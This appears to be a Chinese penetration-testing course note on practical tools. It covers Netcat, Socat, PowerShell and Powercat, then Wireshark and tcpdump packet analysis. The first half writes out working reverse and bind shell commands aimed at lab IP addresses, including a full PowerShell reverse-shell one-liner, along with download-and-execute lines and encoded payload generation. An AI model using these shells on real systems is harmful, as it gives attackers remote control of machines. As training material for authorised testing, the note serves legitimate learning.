# 3-Practical Tools

## Netcat

俗称”瑞士军刀“，使用TCP或UDP协议，通过网络连接读写数据的实用程序。

### 常用例子（格式一般为 nc 选项 IP 端口）：

连接目标的110端口：  `nc -nv 10.211.55.5 110` 

监听本地4444端口： `nc -nlvp 4444` 

### 传输文件:

接收文件： `nc -nlvp 4444 > incomfile` 

发送文件： `nc -nv 10.211.55.5 4444 < /home/kali/file1` 

### 绑定shell

```
nc -nvlp 4444 -e cmd.exe
```

### 反弹shell

```
nc -nv 10.211.55.5 4444 -e /bin/bash
```

## Socat

Socat 是一个命令行实用程序，它建立两个双向字节流并在它们之间传输数据。对于渗透测试，它类似于Netcat，但有额外的有用特性。

### Netcat vs Socat

```
nc <remote server's ip address> 80
socat - TCP4:<remote server's ip address>:80
```

### 常用例子

连接目标的443端口： `socat - TCP4:10.211.55.5:443` 

监听本地的443端口：  `sudo socat TCP4-LISTEN:443 STDOUT` 

### 传输文件

发送文件： `sudo socat TCP4-LISTEN:443,fork file:file1.txt` 

接收文件： `socat TCP4:10.211.55.5:443 file:received.txt,create` 

### 反弹shell

控制方：  `sudo socat -d -d TCP4-LISTEN:443 STDOUT` 

被控方： `socat TCP4:10.211.55.5:443 EXEC:/bin/bash` 

被控方（Windows）：  `socat TCP4:10.211.55.5:443 EXEC:'cmd.exe',pipes` 

### 绑定shell（无加密）

被控方： `sudo socat TCP4-LISTEN:43,fork EXEC:/bin/bash` 

控制方： `socat - TCP4:10.211.55.5:443` 

## PowerShell

Windows PowerShell 是一种基于任务的命令行shell和脚本语言。它是专门为系统管理员和高级用户设计的，用于快速自动化管理多个操作系统(Linux、macOS、Unix和Windows)以及与运行在这些操作系统上的应用程序相关的进程。

### 前提

首先要设置Powershell的执行策略为 Unrestricted

设置执行策略：  `Set-ExecutionPolicy Unrestricted` 

查看执行策略： `Get-ExecutionPolicy` 

### PowerShell 文件传输

```
powershell -c "(new-object System.Net.WebClient).DownloadFile('http://10.211.55.4/wget.exe','C:\Users\offsec\Desktop\wget.exe')"
```

### PowerShell 反弹shell

```
powershell -Command {$client = New-Object System.Net.Sockets.TCPClient('10.211.55.5',443);$stream = $client.GetStream();[byte[]]$bytes = 0..65535|%{0};while(($i =$stream.Read($bytes, 0, $bytes.Length)) -ne 0){;$data = (New-Object -TypeName System.Text.ASCIIEncoding).GetString($bytes,0, $i);$sendback = (iex $data 2>&1 | Out-String );$sendback2 = $sendback + 'PS ' + (pwd).Path + '> ';$sendbyte = ([text.encoding]::ASCII).GetBytes($sendback2);$stream.Write($sendbyte,0,$sendbyte.Length);$stream.Flush()};$client.Close()}
```

### PowerShell 绑定shell

```
`powershell -Command {$listener = New-Object System.Net.Sockets.TcpListener('0.0.0.0',443);$listener.start();$client = $listener.AcceptTcpClient();$stream = $client.GetStream();[byte[]]$bytes = 0..65535|%{0};while(($i = $stream.Read($bytes, 0, $bytes.Length)) -ne 0){;$data = (New-Object -TypeName System.Text.ASCIIEncoding).GetString($bytes,0, $i);$sendback = (iex $data 2>&1 | Out-String );$sendback2 = $sendback + 'PS ' + (pwd).Path + '> ';$sendbyte = ([text.encoding]::ASCII).GetBytes($sendback2);$stream.Write($sendbyte,0,$sendbyte.Length);$stream.Flush()};$client.Close();$listener.Stop()}
```

## Powercat

Powercat 本质上是由besimorhino编写的Netcat的PowerShell版本。这是一个我们可以下载到Windows主机上的脚本，以利用PowerShell的优势并简化绑定/反向shell的创建。

在kali上 `apt install powercat` 就可以下载脚本，默认放在/usr/share/windows-resources/powercat，可以通过传输文件的方式传输到目标windows上。

### 运行

1、从kali上将文件传输过来，然后用 `. .\powercat.ps1` 运行。

2、 `iex (New-Object System.Net.Webclient).DownloadString('https://raw. githubusercontent.com/besimorhino/powercat/master/powercat.ps1')` 

### 传输文件

发送文件：  `powercat -c 10.211.55.5 -p 443 -i C:\Users\Offsec\powercat.ps1` 

### 反弹shell

```
powercat -c 10.211.55.5 -p 443 -e cmd.exe
```

### 绑定shell

```
powercat -l -p 443 -e cmd.exe
```

### 用Powercat生成独立的payload

生成反弹shell脚本：`powercat -c 10.211.55.5 -p 443 -e cmd.exe -g > reverseshell.ps1` 

运行脚本： `./reverseshell.ps1` 

生成反弹shell编码数据： `powercat -c 10.211.55.5 -p 443 -e cmd.exe -ge > encodedreverseshell.ps1` 

运行编码： `powershell.exe -E 编码的数据` 

## Wireshark

Wireshark, 是学习网络协议、分析网络流量和调试网络服务的必备工具。

软件的处理过程：网络 -> 捕获过滤器 -> 捕获引擎 -> 显示过滤器 -> 最后的显示内容。

我们可以定义捕获过滤器去规定软件在捕获流量时的规则，也可以定义显示过滤器，将软件捕获的内容有选择性的显示出来。

### 启动

命令行： `sudo wireshark` 

图形化：菜单 -> Sniffing & Spoofing（嗅探/欺骗）-> wireshark

### Capture Filters 捕获过滤器

![image.png](https://cdn.nlark.com/yuque/0/2020/png/2398693/1604300377404-bca000f9-4e8a-4b22-b1c3-a8f8140313d4.png)

绿色的地方就是填写捕获过滤器的地方，下面蓝色选中的就是当前选择的捕获接口，可以自己根据需要选择其它的，上方菜单的捕获->捕获过滤器里面有一些默认定义好的捕获过滤器，也可以自己添加新的配置，双击就可以应用。更多的过滤语法可以自行搜索和学习。

### Display Filters 显示过滤器

![image.png](https://cdn.nlark.com/yuque/0/2020/png/2398693/1604301143902-356862d5-c4e7-4cfe-a6fe-6ccdec9428aa.png)

绿色的地方是输入显示过滤器的地方，如果过滤规则正确会显示绿色，不正确回事红色， `tcp.port == 21` 就是查看TCP协议的21端口的相应数据包。上方菜单分析->Display Filters里面也有默认定义好的一部分显示过滤器，也可以自行添加。

### 追踪TCP流

![image.png](https://cdn.nlark.com/yuque/0/2020/png/2398693/1604301563100-9751f70d-adab-4d9b-952a-c08bd55783fe.png)

右键关键的请求，然后选择Follow（追踪）-> TCP Stream（TCP流），我的是中文版，英文版大家注意一下意思就可以了。

![image.png](https://cdn.nlark.com/yuque/0/2020/png/2398693/1604301669872-19ec59b4-bd24-4c6d-a596-67e94da062f0.png)

## Tcpdump

Tcpdump 是一种基于文本的网络嗅探器，尽管缺少图形界面，但它是精简的、强大的和灵活的。到目前为止，它是最常用的命令行数据包分析器，可以在大多数Unix和Linux操作系统上找到它，但是本地用户权限决定了捕获网络流量的能力。

### 从捕获文件中读取数据

> 练习文件：https://www.offensive-security.com/pwk-online/password_cracking_filtered.pcap

```
sudo tcpdump -r password_cracking_filtered.pcap
```

### 结合awk等命令过滤处理

例如：显示出现比较多的IP地址。其中 `-n` 是不进行地址解析，就会只显示纯粹的IP地址。

```
sudo tcpdump -n -r password_cracking_filtered.pcap | awk -F " " '{print $3}' | sort | uniq -c | head
```

指定源地址用 `src host xxx.xxx.xxx.xxx` 

```
sudo tcpdump -n src host 172.16.40.10 -r password_cracking_filtered.pcap
```

指定目的地址用 `dst host xxx.xxx.xxx.xxx` 

```
sudo tcpdump -n dst host 172.16.40.10 -r password_cracking_filtered.pcap
```

指定端口用 `port 81` 

```
sudo tcpdump -n port 81 -r password_cracking_filtered.pcap
```

显示16进制数据用 `-X` 

```
sudo tcpdump -nX -r password_cracking_filtered.pcap
```

### Advanced Header Filtering

下图描述了TCP报头，并显示了从第14字节开始定义的TCP标志。

![image.png](https://cdn.nlark.com/yuque/0/2020/png/2398693/1604304405148-da53a1ff-9a62-4b4f-b158-6dd9c0b047d7.png)

此时，为了更好地检查转储中的请求和响应，我们希望过滤掉并仅显示数据包。为此，我们将查找打开了PSH和ACK标志的包。在最初的3路握手之后，所有发送和接收的数据包都设置了ACK标志。PSH标志109用于强制立即发送数据包，在交互式应用层协议中常用以避免缓冲。

根据TCP标志位的排列顺序，ACK和PSH标志位开放的话就是 `00011000` ，十进制也就是 `24` 。

显示数据包命令如下， `-A` 是显示全部信息。因为数组是从0开始的，所以第14个字节就用的 `tcp[13]` 。

```
sudo tcpdump -A -n 'tcp[13] = 24' -r password_cracking_filtered.pcap
```

### Other

这里并没有讲tcpdump的监听，它的监听就是命令行的监听，不指定 `-r` 输入文件，就会去监听请求，然后 `-i` 可以指定想要监听的接口。tcpdump的表达式也很丰富，这里只是简单介绍了一下，有功底的可以直接 `man tcpdump` 去查阅一下，我在网上简单找了几个帖子，可以借鉴一下。

> https://www.jianshu.com/p/d9162722f189
>
> https://www.cnblogs.com/qiumingcheng/p/8075283.html